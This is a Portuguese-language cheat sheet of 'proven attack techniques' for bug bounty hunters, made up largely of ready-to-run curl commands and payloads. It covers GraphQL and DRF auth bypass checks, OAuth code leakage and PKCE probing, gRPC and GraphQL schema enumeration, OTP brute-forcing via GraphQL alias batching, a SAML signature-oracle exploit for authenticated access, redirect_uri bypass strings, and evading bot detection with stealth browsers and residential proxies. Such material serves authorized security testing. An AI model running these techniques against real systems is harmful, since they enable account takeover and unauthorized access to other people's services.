# Técnicas comprovadas de ataque

Técnicas testadas em campo. Referência dos hunters. Cada uma: padrão + como detectar (curl).

## GraphQL — bypass de auth no resolver
**Padrão:** auth é opt-in por resolver, não imposta na camada de serviço.
**Detecção:** manda com e sem header de auth. Se as respostas diferem só no nível de lógica de
negócio (não no de auth), o middleware de auth está ausente.
```bash
# sem auth:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { dangerousMutation(input:{field:\"test\"}){ success } }"}'
# auth falsa:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalidtoken123" \
  -d '{"query":"mutation { dangerousMutation(input:{field:\"test\"}){ success } }"}'
# Se AMBAS retornam o mesmo erro de backend (404/NullRef/erro de negócio) em vez de 401/403
# → o middleware de auth está ausente nesse resolver.
```
**Insight:** 401/403 = middleware pegou. Erro de backend (500/404/negócio) = auth nunca foi
checada. Teste TODA mutation sem auth. Foque em state-changing (SSO, reset, update, sessão).

## DRF — semântica de autenticação
**Padrão:** Django REST Framework impõe auth ANTES de acessar o queryset.
```bash
curl -s "https://api.target.com/accounts/"                    # 401 = auth exigida
curl -s "https://api.target.com/public-resource/nonexistent/" # 404 = AllowAny (auth bypassada)
```
**Regra:** em DRF, 404 com mensagem de erro de queryset prova que a auth nunca foi checada.

## OAuth — vazamento de auth code pra analytics
**Padrão:** code na query da URL → SDK de analytics dispara page_view com a URL inteira → code
transmitido pra GA4/LogRocket/Segment antes do app consumir.
```bash
curl -s "https://target.com/callback?code=test&state=test" | grep -iE "gtag|ga4|logrocket|segment|amplitude|mixpanel|heap"
# se achou analytics, simule o evento; 204 = aceito → code vaza pra analytics
```
**Chain:** vazamento de code + client público (sem secret) + sem PKCE → ATO.

## PKCE — checagem de enforcement
```bash
# manda token request SEM code_verifier:
curl -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=fake&client_id=CLIENT_ID&redirect_uri=REDIR"
# "invalid_grant"                       → PKCE NÃO imposto (code só expirou/inválido)
# "invalid_request: code_verifier ..."  → PKCE imposto
# sem secret: "invalid_grant" = client público · "invalid_client" = confidencial (secret exigido)
```

## Source maps — análise
```bash
curl -sI "https://target.com/static/js/main.abc123.js.map" | head -1   # 200 = acessível
```
Procure: código de client de API com/sem `prepareHeaders` (sem = sem auth); headers de privesc
(`Company-Override`, `X-Admin`); client IDs OAuth / issuer Okta; URLs internas (`*.internal`,
`*.corp`, `edge.<svc>.region`); feature flags; detecção de ambiente (`REACT_APP_*`).

## gRPC — enumeração de método via erro de proxy
Proxies Envoy/gRPC-Web vazam o nome exato do método no erro:
```bash
curl -s "https://target.com/v1/accounts/" -H "Authorization: Bearer invalid"
# {"code":7,"message":"Unauthorized Request: [...] method = /service.v1.Service/AccountList"}
```
Enumere: `for r in accounts users orders holdings wallets transactions; do curl -s "https://target/v1/$r/" | grep -oP 'method = [^"]+'; done`.
Nota: paths non-v1 podem bypassar RBAC; `"Could not resolve"` em PUT/PATCH/DELETE = Envoy só roteia GET+POST.

## GraphQL — reconstrução de schema (Clairvoyance)
Apollo devolve sugestão de campo em typos → reconstrói schema sem introspection:
```bash
curl -X POST target/graphql -d '{"query":"{ usr }"}'          # 'Did you mean "user"?'
curl -X POST target/graphql -d '{"query":"{ user }"}'         # 'must have a selection of subfields'
curl -X POST target/graphql -d '{"query":"{ user { eml } }"}' # 'Did you mean "email"?'
```

## Enumeração de user via divergência de path de erro
Backend retorna paths internos diferentes pra user válido vs inválido. Qualquer diferença
mensurável (mensagem, tempo, status, path) = oráculo de enumeração.

## GraphQL — alias batching (bypass de rate limit)
Aliases mandam N operações num HTTP request só:
```graphql
mutation B { a1:verifyOtp(token:"000001"){success} a2:verifyOtp(token:"000002"){success} ... }
```
10 OTP em 1 request. Rate limiters que contam HTTP requests (não operações GraphQL) são
bypassados. OTP de 6 dígitos brute em ~17 min a 100 req/s.

## SAML — oráculo de assinatura
Endpoint de SSO SP-initiated que assina assertion sem exigir auth:
```bash
curl -s -X POST 'https://target.com/saml/sso' -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'status={"primaryCode":"urn:oasis:names:tc:SAML:2.0:status:Success"}'
# devolveu assertion assinada → oráculo; submeta no ACS pra acesso autenticado
```
Pistas: stack trace ASP.NET com `GenerateSAMLResponse`; path com `SSO`/`SAML`; sem
`InResponseTo` = IdP-initiated (sem binding de sessão).

## Detecção de auth por framework (resumo)
- **DRF:** 401 `"Authentication credentials were not provided."` = auth · 404 queryset = AllowAny.
- **ASP.NET:** `NullReferenceException`/`ArgumentNullException` = código alcançado sem auth; stack vaza controllers.
- **Envoy/gRPC:** 403 vaza `method = /svc/Method`; non-v1 pode bypassar RBAC.
- **Apollo GraphQL:** sugestão de campo reconstrói schema; teste TODA mutation sem auth.

## Checklist de auditoria OAuth (em sequência)
1. Client público: POST token sem `client_secret` (`invalid_grant`=público→escala).
2. PKCE: POST token sem `code_verifier` (`invalid_grant`=não imposto→escala).
3. State: ausente no authorize URL = CSRF no fluxo OAuth.
4. Vazamento analytics: tags no callback = code vaza a terceiro.
5. Validação redirect_uri: `/callback/../evil`, `evil.target.com`, `/callback#`, `/callback/`.
6. Chain: code leak + público + sem PKCE = ATO.

## XSS — superfícies frequentemente esquecidas
Nome de arquivo no upload · bio/perfil (stored no render de outros) · mensagens de erro ·
templates de e-mail · geração de PDF (HTML→PDF: wkhtmltopdf/Puppeteer) · upload de SVG (`<script>`)
· render de Markdown (HTML passthrough) · editores WYSIWYG · `location.hash` · `window.name` ·
handlers postMessage sem checagem de origin.
**Blind XSS:** forms de contato/feedback (render no admin), tickets de suporte, User-Agent/Referer
(dashboards), entradas de log (Kibana/Splunk), URLs de webhook.

## XXE — pontos de entrada esquecidos
Uploads DOCX/XLSX/PPTX (ZIP com XML), SVG, SOAP, parsers RSS/Atom, import de config XML,
`Content-Type: application/xml` em endpoint que normalmente aceita JSON.

## Bypass de bot-detection (CF/Akamai/DataDome)
Alvo devolve 403/interstitial/Turnstile a `curl`/`httpx` vanilla → use um browser stealth
(Camoufox: patch C++ que esconde `navigator.webdriver`, spoofa WebGL, popula `navigator.plugins`).
O stealth é invisível à detecção JS porque é aplicado antes do JS rodar. **Cuidado:** stealth ≠
anonimato — o IP é o seu egress; de datacenter ainda verá Turnstile → parear com proxy residencial.
